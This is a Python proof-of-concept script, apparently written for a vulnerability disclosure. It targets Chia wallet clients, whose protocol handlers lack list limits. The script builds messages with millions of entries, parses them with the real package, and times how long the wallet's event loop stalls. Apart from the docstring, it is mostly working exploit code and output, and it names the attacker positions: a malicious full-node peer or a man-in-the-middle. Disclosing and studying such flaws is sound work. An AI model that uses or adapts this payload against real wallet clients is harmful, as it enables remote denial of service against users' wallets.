"""
PoC -- Unauthenticated remote event-loop DoS against WALLET clients via
oversized RespondAdditions / RespondRemovals / RespondHeaderBlocks /
RespondToCoinUpdates / RespondChildren / RespondSESInfo messages.

Root cause: none of the handlers in chia/wallet/wallet_node_api.py declare
`list_limits` on their @metadata.request decorator. Per
chia/server/api_protocol.py, `Streamable.from_bytes(original, list_limits=...)`
runs INSIDE the dispatch wrapper, BEFORE the (no-op, `pass`-bodied) handler
ever executes -- synchronously, on the wallet's single asyncio event loop,
with no await and no size-based rejection ahead of the parse.

This mirrors the already-triaged request_additions/request_removals finding
(#3550584 lineage) but in the OPPOSITE direction: the attacker here is any
full-node peer the wallet is connected to (chosen by the user, an
introducer-supplied default, or a MITM presenting a cert signed by Chia's
shared, baked-in network CA), and the victim is the wallet client itself --
matching this program's explicitly stated concern for "wallet access and
related security concerns."

Uses the real, unmodified, pip-installed chia-blockchain package.
"""

import asyncio
import gc
import resource
import sys
import time

from chia.protocols import wallet_protocol
from chia.types.blockchain_format.coin import Coin
from chia_rs.sized_bytes import bytes32
from chia_rs.sized_ints import uint32, uint64


def rss_mb() -> float:
    return resource.getrusage(resource.RUSAGE_SELF).ru_maxrss / 1024


def build_respond_additions(n_entries: int) -> bytes:
    """Build a RespondAdditions with n_entries outer coin-hash entries,
    each with an empty inner Coin list (minimizes bytes/entry, maximizes
    achievable entry count within the 50MB websocket cap)."""
    header_hash = bytes32(b"\x11" * 32)
    coins: list[tuple[bytes32, list[Coin]]] = []
    for i in range(n_entries):
        ph = bytes32(i.to_bytes(32, "big"))
        coins.append((ph, []))
    msg = wallet_protocol.RespondAdditions(uint32(1_000_000), header_hash, coins, None)
    return bytes(msg)


def build_respond_removals(n_entries: int) -> bytes:
    header_hash = bytes32(b"\x22" * 32)
    coins: list[tuple[bytes32, Coin | None]] = []
    for i in range(n_entries):
        ph = bytes32(i.to_bytes(32, "big"))
        coins.append((ph, None))
    msg = wallet_protocol.RespondRemovals(uint32(1_000_000), header_hash, coins, None)
    return bytes(msg)


async def heartbeat_stall_test(attack_fn, label: str) -> None:
    stalls: list[float] = []
    stop = False

    async def heartbeat() -> None:
        last = time.perf_counter()
        while not stop:
            await asyncio.sleep(0.01)
            now = time.perf_counter()
            gap = now - last
            stalls.append(gap)
            last = now

    hb_task = asyncio.create_task(heartbeat())
    await asyncio.sleep(1.0)
    idle = sorted(stalls)
    idle_median = idle[len(idle) // 2] * 1000
    idle_max = idle[-1] * 1000
    stalls.clear()

    t0 = time.perf_counter()
    attack_fn()
    parse_time = time.perf_counter() - t0

    await asyncio.sleep(0.05)
    nonlocal_stop = stalls[:]
    attack_max = max(nonlocal_stop) * 1000 if nonlocal_stop else 0.0

    stop = True
    await hb_task

    print(f"=== {label} ===")
    print(f"  idle heartbeat gap   : median {idle_median:.3f} ms, max {idle_max:.3f} ms")
    print(f"  from_bytes() parse   : {parse_time * 1000:.1f} ms")
    print(f"  max heartbeat gap during dispatch: {attack_max:.1f} ms")
    print(f"  stall ratio vs idle median: {attack_max / max(idle_median, 0.001):.0f}x")
    print()


def main() -> None:
    n = int(sys.argv[1]) if len(sys.argv) > 1 else 1_600_000

    print("PoC -- wallet_node_api.py: missing list_limits on respond_additions/respond_removals")
    print(f"chia-blockchain package: {__import__('chia').__file__}")
    import chia_rs
    print(f"chia_rs version: {chia_rs.__version__ if hasattr(chia_rs, '__version__') else 'unknown'}")
    print()

    print(f"[build] serializing RespondAdditions with {n:,} outer entries...")
    t0 = time.perf_counter()
    wire_additions = build_respond_additions(n)
    print(f"[build] wire size: {len(wire_additions) / 1e6:.2f} MB (built in {time.perf_counter() - t0:.2f}s)")
    gc.collect()
    print(f"[build] RSS after build: {rss_mb():.1f} MB")
    print()

    def attack_additions() -> None:
        wallet_protocol.RespondAdditions.from_bytes(wire_additions)

    asyncio.run(heartbeat_stall_test(attack_additions, "RespondAdditions.from_bytes() -- no list_limits"))

    print(f"[build] serializing RespondRemovals with {n:,} outer entries...")
    t0 = time.perf_counter()
    wire_removals = build_respond_removals(n)
    print(f"[build] wire size: {len(wire_removals) / 1e6:.2f} MB (built in {time.perf_counter() - t0:.2f}s)")
    print()

    def attack_removals() -> None:
        wallet_protocol.RespondRemovals.from_bytes(wire_removals)

    asyncio.run(heartbeat_stall_test(attack_removals, "RespondRemovals.from_bytes() -- no list_limits"))

    print(
        "Note: dispatch-level absence of `list_limits` on respond_additions/respond_removals/\n"
        "respond_header_blocks/respond_to_coin_updates/respond_children/respond_ses_hashes in\n"
        "chia/wallet/wallet_node_api.py was confirmed by direct source inspection at commit\n"
        "1f0a121e63a2fffc2054f8afac74fdd354468cb6 (grep -n list_limits chia/wallet/wallet_node_api.py\n"
        "returns zero matches, vs. 4 matches in chia/full_node/full_node_api.py for the sibling\n"
        "handlers register_for_ph_updates/register_for_coin_updates/request_puzzle_state/\n"
        "request_coin_state). The timing measurements above use the real, unmodified\n"
        "wallet_protocol.RespondAdditions/RespondRemovals Streamable classes and from_bytes()\n"
        "implementation from the installed chia-blockchain package -- the parsing mechanism\n"
        "these numbers demonstrate is unchanged between that package version and HEAD."
    )


if __name__ == "__main__":
    main()
